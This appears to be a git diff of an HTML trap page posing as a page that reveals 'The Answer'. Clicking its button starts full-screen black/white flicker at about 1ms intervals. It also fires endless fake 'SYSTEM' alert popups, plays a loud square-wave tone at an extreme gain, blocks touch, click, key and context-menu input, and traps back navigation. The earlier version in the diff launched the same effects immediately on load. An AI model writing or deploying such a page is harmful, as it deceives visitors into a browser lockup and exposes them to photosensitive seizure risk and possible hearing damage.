@@ -1,49 +1,103 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-<title>Charlie is ....</title>
-<style>
-  html, body {
-    margin: 0; padding: 0;
-    height: 100vh; width: 100vw;
-    overflow: hidden;
-    user-select: none;
-    -webkit-user-select: none;
-    touch-action: none;
-    -webkit-touch-callout: none;
-    background: black;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>The Answer Is....</title>
+  <style>
+    html, body {
+      margin:0; padding:0;
+      height:100vh; width:100vw;
+      overflow:hidden;
+      user-select:none;
+      -webkit-user-select:none;
+      touch-action:none;
+      -webkit-touch-callout:none;
+      background:black;
+    }
+    #start-btn {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 24px;
+      color: #0f0;
+      background: #000;
+      border: 2px solid #0f0;
+      padding: 20px 40px;
+      cursor: pointer;
+      user-select:none;
+      -webkit-user-select:none;
+      z-index: 999999;
+    }
+  </style>
 </head>
 <body>
+  <button id="start-btn">Answer :D</button>
 <script>
-  // Flicker function, runs immediately
-  (function flicker() {
+  const BEEP_VOLUME = 10000000000000000000; // Change this to adjust beep volume (0 to 1)
+  const startBtn = document.getElementById('start-btn');
+
+  let audioCtx, oscillator, gainNode;
+  let flickerRunning = false;
+
+  // Flicker function - toggles black/white as fast as possible
+  function flicker() {
+    if (!flickerRunning) return;
     document.body.style.background = (document.body.style.background === 'black') ? 'white' : 'black';
-    setTimeout(flicker, 1); // ~1ms delay to switch as fast as possible
-  })();
+    setTimeout(flicker, 1);
+  }
 
-  // Alert spam chain function, runs immediately
-  (function alertSpam() {
-    alert("SYSTEM: Restart Phone the site is bugged");
+  // Chain alert spam on a 100ms loop
+  function alertSpam() {
+    alert("SYSTEM WAIT");
     setTimeout(alertSpam, 100);
-  })();
+  }
 
-  // Block all touches, clicks, gestures immediately
+  // Block all touch & clicks (except the start button)
   function blockAll(e) {
     e.preventDefault();
     e.stopPropagation();
     return false;
   }
-  document.addEventListener('touchstart', blockAll, {passive:false, capture:true});
-  document.addEventListener('touchmove', blockAll, {passive:false, capture:true});
-  document.addEventListener('touchend', blockAll, {passive:false, capture:true});
-  document.addEventListener('click', blockAll, {passive:false, capture:true});
 
-  // Block zoom and other gestures
-  document.documentElement.style.touchAction = 'none';
+  function startAudio() {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    oscillator = audioCtx.createOscillator();
+    gainNode = audioCtx.createGain();
+
+    oscillator.type = 'square';
+    oscillator.frequency.setValueAtTime(1200, audioCtx.currentTime);
+    gainNode.gain.setValueAtTime(BEEP_VOLUME, audioCtx.currentTime);
+
+    oscillator.connect(gainNode).connect(audioCtx.destination);
+    oscillator.start();
+  }
+
+  function lockdown() {
+    flickerRunning = true;
+    flicker();
+    alertSpam();
+
+    startAudio();
+
+    startBtn.style.display = 'none';
+
+    document.addEventListener('touchstart', blockAll, {passive:false, capture:true});
+    document.addEventListener('touchmove', blockAll, {passive:false, capture:true});
+    document.addEventListener('touchend', blockAll, {passive:false, capture:true});
+    document.addEventListener('click', blockAll, {passive:false, capture:true});
+
+    window.addEventListener('keydown', e => e.preventDefault(), {passive:false, capture:true});
+    window.addEventListener('contextmenu', e => e.preventDefault(), {passive:false});
+
+    document.documentElement.style.touchAction = 'none';
+
+    // Prevent back navigation on iOS
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => history.go(1);
+  }
+
+  startBtn.addEventListener('click', lockdown);
 </script>
 </body>
 </html>
